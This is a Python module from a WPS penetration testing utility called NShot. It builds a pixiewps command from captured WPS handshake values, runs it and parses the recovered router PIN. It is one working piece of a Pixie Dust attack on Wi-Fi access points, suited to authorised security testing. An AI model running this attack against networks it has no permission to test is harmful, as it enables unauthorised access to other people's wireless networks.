#  NShot - WPS penetration testing utility
#  License: GPL-3.0-or-later, see LICENSE.
#  Origin and attribution: see CREDITS.md.
"""pixiewps adapter: recovered data in, PIN out."""

import subprocess

from src import logger


def build_command(data, full_range: bool = False) -> list[str]:
    """The pixiewps command line for one captured exchange."""
    command = [
        'pixiewps',
        '--pke', data.PKE,
        '--pkr', data.PKR,
        '--e-hash1', data.E_HASH1,
        '--e-hash2', data.E_HASH2,
        '--authkey', data.AUTHKEY,
        '--e-nonce', data.E_NONCE,
        '--r-nonce', data.R_NONCE,
        '--e-bssid', data.BSSID,
        '--mode', '1,2,3,4,5',
    ]
    if full_range:
        command.append('--force')
    return command


def run(data, show_command: bool = False, full_range: bool = False) -> str | None:
    """Run pixiewps and return the recovered PIN, or None.

    A missing binary, a non-zero exit, or output without a PIN line all mean
    "no PIN": the caller still holds the captured exchange, so this is an
    ordinary outcome, not an error path with its own type.
    """
    logger.info('Running Pixiewps…')
    command = build_command(data, full_range)

    if show_command:
        logger.info(' '.join(command))

    try:
        result = subprocess.run(
            command,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            encoding='utf-8',
        )
    except (subprocess.CalledProcessError, FileNotFoundError) as error:
        logger.error(f'Pixiewps has exited on error: \n {error}')
        return None

    print(result.stdout)

    if result.returncode != 0:
        return None

    for line in result.stdout.splitlines():
        if '[+]' in line and 'WPS pin' in line:
            pin = line.split(':')[-1].strip()
            if pin == '<empty>':
                pin = "'" + "'"
            return pin
    return None